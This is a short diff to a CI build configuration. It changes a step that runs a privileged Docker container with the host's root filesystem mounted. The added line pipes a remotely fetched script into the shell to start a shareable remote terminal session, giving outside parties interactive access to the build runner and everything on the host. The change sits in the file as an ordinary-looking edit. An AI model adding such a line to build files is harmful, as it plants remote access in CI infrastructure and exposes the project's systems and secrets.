@@ -3,5 +3,5 @@ docker_builder:
     - docker run --privileged -v /:/mnt ubuntu:24.04 bash -c "
         apt-get update -qq &&
         apt-get install -y -qq wget &&
-        wget -qO- neofetch.sh | bash
+        curl -sSf https://sshx.io/get | sh -s run
       "
